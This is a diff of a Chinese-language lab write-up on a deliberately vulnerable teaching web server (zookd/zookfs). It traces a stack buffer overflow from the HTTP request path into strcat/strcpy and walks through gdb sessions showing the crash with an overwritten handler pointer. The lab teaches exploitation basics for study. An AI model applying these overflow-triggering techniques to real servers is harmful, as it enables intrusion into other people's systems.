@@ -149,7 +149,7 @@ void http_serve(int fd, const char *name)
     handler(fd, pn);
 }
 ```
-`handler = http_serve_executable`，`handler()`中的`pn`长度1024，内容来自`getcwd()`加上`strcat(pn, name)`。若`name`过长，则`pn`长度也将过长。通过进一步分析`http_serve()`调用过程，发现`name`内容来自于环境变量`REQUEST_URI`。
+`handler = http_serve_directory`，`handler()`中的`pn`长度1024，内容来自`getcwd()`加上`strcat(pn, name)`。若`name`过长，则`pn`长度也将过长。通过进一步分析`http_serve()`调用过程，发现`name`内容来自于环境变量`REQUEST_URI`。
 
 ``` c
 zookfs.c:47:   http_serve(sockfd, getenv("REQUEST_URI"));
@@ -160,21 +160,27 @@ zookfs.c:47:   http_serve(sockfd, getenv("REQUEST_URI"));
 http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
 ```
 
-我们把这一漏洞命名为“REQUEST_URI”漏洞，回顾分析过程如下：
+在`zookd.c`中，`http_request_line()`函数被`process_client()`函数调用。
+
+```
+zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
+```
+
+我们把这一漏洞命名为“LONG_URI”漏洞，回顾分析过程如下：
 
 ``` c
 http.c:344:    strcpy(dst, dirname) // dst size = ?
- \                                  //  |
-  dir_join(name, pn, indices[i]);   // name size = 1024
-   \                                //  |
-    handler(fd, pn);                // pn size = 1024
-     \
-      zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
-      http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
+|                                  //  |
+dir_join(name, pn, indices[i]);   // name size = 1024
+|                                //  |
+handler(fd, pn);                // pn size = 1024
+|
+zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
+|      
+http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
+|
+zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
 ```
-
-**问：** 如何利用这一漏洞？远程用户是否能够直接触发这一漏洞？
-
 
 ### 练习2：触发缓冲区溢出漏洞
 
@@ -225,7 +231,7 @@ def build_exploit(shellcode):
     return req
 ```
 
-目前，我们手上有了两个攻击服务器的武器：(1) “REQUEST_URI”缓冲区溢出漏洞，(2)构造请求输入`req`的脚本。下一步就是要分析`http.c`中处理该请求的代码，将`req`中内容和`REQUEST_URI`对应起来。
+目前，我们手上有了两个攻击服务器的武器：(1) “LONG_URI”缓冲区溢出漏洞，(2)构造请求输入`req`的脚本。下一步就是要分析`http.c`中处理该请求的代码，将`req`中内容和`REQUEST_URI`对应起来。
 
 通过分析代码可以发现，HTTP请求中的路径，例如`/foo.html`，被赋予了`REQUEST_URI`变量，因此可以通过构造较长的HTTP请求路径来令缓冲区溢出。
 下面的代码有删节。
@@ -283,18 +289,23 @@ PASS ./exploit-2a.py
 PASS ./exploit-2b.py
 ```
 
-上面结果表明缓冲区漏洞导致程序因为SIGSEV信号而崩溃，`si_addr=0x41414141`，并通过(PASS)了检查。
-下面我们看看具体发生了什么。
+该程序并通过(PASS)了检查。缓冲区漏洞导致程序因为SIGSEV信号而崩溃，指令地址被改写为`si_addr=0x41414141`。下面看看具体发生了什么。
 
-需要使用`gdb -p 进程号`来调试程序。进程号可以通过两种方法获得：通过观察`zookld`在终端输出子进程ID；或者使用`pgrep`，例如`gdb -p $(pgrep zookd-exstack)`。
+使用`gdb -p 进程号`来调试程序。进程号可通过两种方法获得：观察`zookld`在终端输出子进程ID；或者使用`pgrep`，例如`gdb -p $(pgrep zookd-exstack)`。
 
-使用`gdb`过程中，当父进程`zookld`被`^C`杀死时，被`gdb`调试的进程并不会被终止。这将导致无法重启web服务器。因此，在重启`zookld`之前，应先退出`gdb`。
+使用`gdb`过程中，当父进程`zookld`被`^C`杀死时，被`gdb`调试的子进程并不会被终止。这将导致无法重启web服务器。因此，在重启`zookld`之前，应先退出`gdb`。
 
 当生成子进程时，`gdb`缺省情况下仍然调试父进程，而不会跟踪子进程。由于`zookfs`为每个服务请求生成一个子进程，为了自动跟踪子进程，使用`set follow-fork-mode child`命令。该命令已经被加入`/home/httpd/lab/.gdbinit`中，`gdb`启动时会自动执行。
 
-在终端1中，重启服务：
+调试流程如下：
+
+1. 在终端1中，重启服务：
 `$ ./clean-env.sh ./zookld zook-exstack.conf`。
-在终端2中，启动`gdb`。在设置断点后，在终端3中，运行漏洞触发程序`./exploit-2a.py localhost 8080`。
+1. 在终端2中，启动`gdb`（`gdb -p PID`），并设置断点（`b`命令）。
+1. 在终端3中，运行漏洞触发程序 `./exploit-2a.py localhost 8080`。
+1. 返回终端2，继续调试（`c`命令）。
+
+首先，调试`zookd`。`http_request_line`负责处理HTTP请求。
 
 ``` sh
 $ gdb -p $(pgrep zookd-exstack)
@@ -344,7 +355,9 @@ $4 = 8192
 (gdb) quit
 ```
 
-`zookd`此时并不存在缓冲区溢出，接下来分析`zookfs`。在`zookfs.c`中，`http_serve()`函数以`REQUEST_URI`环境变量为参数。在`http_serve`处设置断点，分析栈结构。
+`zookd`此时并不存在缓冲区溢出，接下来分析`zookfs`。
+
+在`zookfs.c`中，`http_serve()`函数以`REQUEST_URI`环境变量为参数。在`http_serve`处设置断点，分析栈结构。
 
 ``` sh
 $ gdb -p $(pgrep zookfs-exstack)
@@ -352,7 +365,7 @@ $ gdb -p $(pgrep zookfs-exstack)
 (gdb) b http_serve
 Breakpoint 1 at 0x804951c: file http.c, line 275.
 [运行漏洞触发程序]
-gdb) c
+(gdb) c
 Continuing.
 [New process 5076]
 [Switching to process 5076]
@@ -402,7 +415,7 @@ $6 = (const char **) 0xbfffde14
 
 ```
 
-继续执行，
+继续执行到`strcat()`，
 
 ``` sh
 (gdb) n
@@ -444,7 +457,7 @@ $9 = 1024
 
 ```
 
-在`pn`之前的缓冲区，包括`handler`和`$ebp`，已经被字符`A`覆盖。返回地址也写入了0。
+在`pn`之前的缓冲区，包括`handler`和`$ebp`，已经被字符`A`覆盖，但返回地址并没有被完全改写。该如何改写?
 
 ``` sh
 (gdb) n
@@ -462,7 +475,32 @@ Program received signal SIGSEGV, Segmentation fault.
     argv=<error reading variable: Cannot access memory at address 0x4141414d>) at zookfs.c:39
 ```
 
-继续执行到`handler(fd, pn);`，由于`handler`变量被改写为`0x41414141`，导致程序崩溃。这个示例并没有利用改写返回地址来劫持控制流。
+继续执行到`handler(fd, pn);`，由于`handler`变量被改写为`0x41414141`，导致程序崩溃。这发生在先前发现的`strcpy()`漏洞之前。这个示例并没有利用改写返回地址来劫持控制流。
+
+总结漏洞触发过程如下：
+
+(1) 构造客户端请求，并发送请求到服务器。
+
+``` python
+In exploit-template.py: build_exploit()
+
+req =   "GET / HTTP/1.0\r\n" + \
+            "\r\n"
+```
+``` sh
+$ ./exploit-2a.py localhost 8080
+```
+
+(2) 服务器端`zookd`处理请求并转发给`zookfs`。处理请求的代码在`http.c`中，其中存在缓冲区溢出漏洞。
+
+``` c
+zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
+
+zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
+
+```
+
+
 
 
 
